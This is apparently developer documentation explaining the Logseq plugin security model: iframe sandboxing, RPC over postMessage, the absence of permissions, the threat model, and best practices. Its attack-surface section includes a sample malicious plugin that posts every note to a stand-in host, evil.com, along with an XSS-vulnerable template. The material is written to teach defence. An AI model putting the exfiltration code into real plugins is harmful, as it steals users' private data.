---
title: 'Plugin Security Architecture'
status: 🟢 Stable
version: '@logseq/libs v0.0.17'
quadrant: 'Explanation'
platform: '🟠 Desktop Only'
related-docs:
  - '[First Plugin Tutorial](../../tutorials/plugins/first-plugin.md)'
  - '[Plugin API Reference](../../reference/api/plugin-api.md)'
  - '[Publishing Plugins](../../how-to/plugins/publish-plugin.md)'
tags: ['plugin', 'security', 'sandbox', 'iframe', 'permissions', 'rpc']
---

# Plugin Security Architecture

This document explains Logseq's plugin security model—how the platform isolates untrusted plugin code while enabling safe interaction with user data. Understanding this architecture is essential for plugin developers and security-conscious users.

**What You'll Learn:**

- Iframe sandbox isolation model
- PostMessage RPC communication
- Permission and trust boundaries
- Attack surface and mitigations
- Security best practices

**Prerequisites:**

- Basic understanding of plugins ([First Plugin Tutorial](../../tutorials/plugins/first-plugin.md))
- Familiarity with web security concepts

---

## Table of Contents

1. [Security Model Overview](#security-model-overview)
2. [Iframe Sandbox Architecture](#iframe-sandbox-architecture)
3. [RPC Communication](#rpc-communication)
4. [Permission System](#permission-system)
5. [Trust Boundaries](#trust-boundaries)
6. [Attack Surface](#attack-surface)
7. [Security Best Practices](#security-best-practices)

---

## Security Model Overview

### Design Goals

**Primary Goals:**

1. **Isolate untrusted plugin code** from Logseq core
2. **Prevent unauthorized data access** to other graphs/plugins
3. **Enable safe extensibility** with minimal permission system
4. **Protect user privacy** (local-first data)

**Non-Goals:**

- Prevent all malicious plugins (trust required at install time)
- Sandbox network requests (plugins can access internet)
- Prevent UI spoofing (plugins render in Logseq UI)

### Threat Model

**Assumed Threats:**

| Threat                     | Risk Level | Mitigation                     |
| -------------------------- | ---------- | ------------------------------ |
| **Malicious plugin**       | High       | Manual review, community trust |
| **Compromised dependency** | Medium     | Marketplace vetting            |
| **Accidental data leak**   | Low        | API restrictions               |
| **XSS injection**          | Low        | Iframe isolation               |
| **Privilege escalation**   | Low        | No elevated API                |

**Out of Scope:**

- Physical access attacks
- Electron vulnerabilities
- Operating system exploits

---

## Iframe Sandbox Architecture

### Plugin Loading

**Plugin Execution Environment:**

```
┌─────────────────────────────────────────────────────────┐
│                Logseq Main Window (Electron)            │
│  • User data (graphs, settings, files)                  │
│  • Trusted code (Logseq core)                           │
│  • Node.js APIs (via IPC to main process)               │
└────────────────────┬────────────────────────────────────┘
                     │ window.postMessage
                     │ (RPC calls only)
┌────────────────────▼────────────────────────────────────┐
│            Plugin Iframe (Sandboxed)                    │
│  • Untrusted plugin code (user-installed)               │
│  • No direct DOM access to main window                  │
│  • No direct access to Node.js APIs                     │
│  • Limited to exposed RPC methods                       │
│                                                          │
│  Sandbox Attributes:                                    │
│  • sandbox="allow-scripts allow-same-origin"            │
│  • Cross-origin isolation (separate origin)             │
└─────────────────────────────────────────────────────────┘
```

### Iframe Sandbox Attributes

**Location:** `src/main/frontend/extensions/srs/handler.cljs` (plugin loader)

```html
<iframe
  sandbox="allow-scripts allow-same-origin"
  src="logseq://plugin/my-plugin-id/index.html"
  id="plugin-iframe-my-plugin-id"
/>
```

**Sandbox Restrictions:**

| Attribute                   | Allowed               | Blocked                  |
| --------------------------- | --------------------- | ------------------------ |
| `allow-scripts`             | JavaScript execution  | -                        |
| `allow-same-origin`         | LocalStorage, cookies | Cross-origin requests    |
| **Not allowed:**            | -                     | -                        |
| (no `allow-forms`)          | -                     | Form submission          |
| (no `allow-popups`)         | -                     | Window.open()            |
| (no `allow-top-navigation`) | -                     | Parent window navigation |
| (no `allow-modals`)         | -                     | alert(), confirm()       |

**Security Benefit:** Plugin cannot:

- Access main window DOM directly
- Navigate parent window
- Open popups or dialogs
- Submit forms to arbitrary URLs

---

## RPC Communication

### PostMessage Protocol

**Bi-directional RPC** between main window and plugin iframe:

```typescript
// Plugin → Main Window (request)
parent.postMessage(
  {
    type: 'call',
    method: 'logseq.Editor.getBlock',
    args: [{ uuid: 'abc-123' }],
    callId: 'call-456',
  },
  '*'
)

// Main Window → Plugin (response)
iframe.contentWindow.postMessage(
  {
    type: 'response',
    callId: 'call-456',
    result: { uuid: 'abc-123', content: 'Block text' },
  },
  '*'
)
```

**Security Properties:**

- **No direct function calls** - All communication is serialized JSON
- **Explicit API surface** - Only registered RPC methods accessible
- **Async-only** - No synchronous access to main window state
- **Message validation** - Main window validates all plugin requests

### API Registration

**Location:** `libs/src/LSPlugin.ts:1250-1300`

```typescript
// Main window: Register API methods
const apiRegistry = {
  'logseq.Editor.getBlock': (args) => getBlockImpl(args),
  'logseq.Editor.insertBlock': (args) => insertBlockImpl(args),
  // ... only explicitly registered methods accessible
}

// Plugin: Call via SDK wrapper
await logseq.Editor.getBlock({ uuid: 'abc-123' })
// Internally becomes postMessage RPC call
```

**Security Benefit:**

- Main window controls **exact API surface** exposed to plugins
- No access to internal functions or data structures
- API can be versioned and deprecated safely

---

## Permission System

### Current State (v0.0.17)

**⚠️ Minimal Permission System:**

Logseq currently has **no granular permission system**. All plugins have **equal access** to:

- **Read/write all graph data** (blocks, pages, properties)
- **Read/write settings** (plugin-scoped, not global)
- **Execute external commands** (via shell)
- **Network requests** (arbitrary HTTP/HTTPS)
- **Render UI components** (in Logseq UI context)

### Trust Model

**Install-time Trust:**

```
User installs plugin → Plugin gains full API access
```

**No Runtime Permissions:**

- Plugins don't request specific permissions
- No UI to review/revoke permissions
- User trusts plugin developer at install time

**Marketplace Vetting:**

- Manual review by Logseq team (not automated)
- Community reputation and reviews
- Open-source code transparency

### Future Permission System

**Potential Permissions (not implemented):**

| Permission        | Scope                 | Example Use Case  |
| ----------------- | --------------------- | ----------------- |
| `graph:read`      | Read graph data       | Search, analytics |
| `graph:write`     | Modify blocks/pages   | Task management   |
| `settings:write`  | Update app settings   | Theme switcher    |
| `shell:execute`   | Run external commands | Git integration   |
| `network:request` | HTTP requests         | API integrations  |
| `ui:render`       | Render UI components  | Custom views      |

---

## Trust Boundaries

### Trusted vs Untrusted Code

```
┌─────────────────────────────────────────────────────────┐
│               TRUSTED ZONE                              │
│                                                          │
│  • Logseq Core (ClojureScript)                          │
│  • Electron Main Process (Node.js)                      │
│  • Native Node.js APIs (fs, child_process)              │
│  • User's file system                                   │
└────────────────────┬────────────────────────────────────┘
                     │ RPC Boundary (postMessage)
┌────────────────────▼────────────────────────────────────┐
│               UNTRUSTED ZONE                            │
│                                                          │
│  • Plugin code (JavaScript/TypeScript)                  │
│  • Plugin dependencies (npm packages)                   │
│  • Third-party libraries                                │
└─────────────────────────────────────────────────────────┘
```

### Data Flow Constraints

**Inbound (Plugin → Main):**

- All API calls validated
- Arguments serialized (no functions or objects with methods)
- Rate limiting (not implemented yet)

**Outbound (Main → Plugin):**

- Only requested data returned
- No sensitive data (API keys, passwords) exposed
- Graph data scoped to current graph (no cross-graph access)

---

## Attack Surface

### Known Risks

**1. Malicious Plugins**

**Risk:** Plugin intentionally exfiltrates user data

```typescript
// Malicious plugin example
const blocks = await logseq.Editor.getAllBlocks()
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify(blocks), // Send user's private notes
})
```

**Mitigation:**

- Manual marketplace review
- Community reporting
- Open-source transparency

**2. Supply Chain Attacks**

**Risk:** Compromised npm dependency

```json
// Plugin's package.json
{
  "dependencies": {
    "legitimate-lib": "^1.0.0",
    "backdoored-lib": "^2.1.3" // Compromised package
  }
}
```

**Mitigation:**

- npm audit checks
- Lock files (package-lock.json)
- Marketplace vetting

**3. XSS in Plugin UI**

**Risk:** Plugin renders unsanitized user input

```typescript
// Vulnerable plugin code
logseq.provideUI({
  template: `<div>${unsanitizedUserInput}</div>`, // XSS!
})
```

**Mitigation:**

- React/Vue sanitization (if used)
- CSP headers (limited effectiveness in iframe)

**4. Privilege Escalation**

**Risk:** Plugin exploits Electron context isolation bugs

**Mitigation:**

- Keep Electron updated
- Monitor security advisories
- Iframe sandboxing as defense-in-depth

---

## Security Best Practices

### For Plugin Developers

**1. Minimize Data Access**

```typescript
// ❌ Bad: Fetch all blocks unnecessarily
const allBlocks = await logseq.Editor.getAllBlocks()
const targetBlock = allBlocks.find((b) => b.uuid === uuid)

// ✅ Good: Fetch only needed data
const targetBlock = await logseq.Editor.getBlock({ uuid })
```

**2. Sanitize User Input**

```typescript
// ❌ Bad: Render unsanitized HTML
const html = `<div>${userInput}</div>`
logseq.provideUI({ template: html })

// ✅ Good: Use safe templating
import DOMPurify from 'dompurify'
const safeHtml = DOMPurify.sanitize(userInput)
```

**3. Validate External Data**

```typescript
// ❌ Bad: Trust API response directly
const data = await fetch('https://api.example.com/data')
const json = await data.json()
await logseq.Editor.insertBlock({ content: json.content })

// ✅ Good: Validate structure and types
const schema = z.object({
  content: z.string().max(10000),
})
const validated = schema.parse(json)
await logseq.Editor.insertBlock({ content: validated.content })
```

**4. Secure API Keys**

```typescript
// ❌ Bad: Hardcode API keys
const API_KEY = 'sk-1234567890abcdef'

// ✅ Good: Store in plugin settings (user-configured)
const apiKey = logseq.settings?.apiKey
if (!apiKey) {
  throw new Error('Please configure API key in plugin settings')
}
```

**5. Audit Dependencies**

```bash
# Check for vulnerabilities
npm audit

# Update dependencies
npm audit fix

# Review dependency tree
npm ls --all
```

### For Users

**1. Install Trusted Plugins**

- Check marketplace reviews
- Verify developer reputation
- Review source code (if open-source)
- Start with official/popular plugins

**2. Review Plugin Permissions** (when system implemented)

- Understand what data plugin accesses
- Deny unnecessary permissions
- Regularly audit installed plugins

**3. Keep Logseq Updated**

- Security patches in core
- Electron security updates
- Plugin SDK improvements

**4. Report Suspicious Behavior**

- Unexpected network requests
- Performance degradation
- Data corruption
- UI spoofing

---

## Comparison: Logseq vs Other Platforms

| Platform               | Isolation                | Permissions                 | Trust Model              |
| ---------------------- | ------------------------ | --------------------------- | ------------------------ |
| **Logseq**             | Iframe sandbox           | None (full access)          | Install-time             |
| **VS Code**            | Node.js subprocess       | Granular (workspace, files) | Explicit permissions     |
| **Obsidian**           | Sandboxed VM             | Community plugins trusted   | Install-time             |
| **Notion**             | Server-side APIs         | OAuth scopes                | OAuth consent            |
| **Browser Extensions** | Content script isolation | Declarative manifest        | Install-time permissions |

**Logseq Uniqueness:**

- **Local-first**: No server-side validation
- **Full API access**: Simplifies development but higher trust requirement
- **Marketplace vetting**: Manual review process

---

## Future Improvements

**Planned Security Enhancements:**

1. **Granular Permissions**

   - Request-based permission system
   - User consent UI
   - Runtime permission revocation

2. **API Rate Limiting**

   - Prevent abuse (e.g., getBlock() 10000 times/sec)
   - Throttle expensive operations

3. **Network Request Policies**

   - Declare allowed domains in manifest
   - Warn user on unexpected requests

4. **Content Security Policy (CSP)**

   - Stricter iframe CSP headers
   - Prevent inline script execution

5. **Sandboxed Node.js API**
   - Controlled file system access (via Electron IPC)
   - No direct child_process access

---

## Next Steps

**Continue Learning:**

1. **[First Plugin Tutorial](../../tutorials/plugins/first-plugin.md)** - Build secure plugins
2. **[Plugin API Reference](../../reference/api/plugin-api.md)** - Available API methods
3. **[Publishing Plugins](../../how-to/plugins/publish-plugin.md)** - Marketplace submission
4. **[Contributing to Core](../../tutorials/development/setup-dev-environment.md)** - Improve security

**For Security Researchers:**

- Report vulnerabilities: security@logseq.com
- Responsible disclosure policy
- Bug bounty program (if available)

---

**Questions or Feedback?** Join the [Logseq Discord](https://discord.gg/KpN4eHY) or visit [discuss.logseq.com](https://discuss.logseq.com).
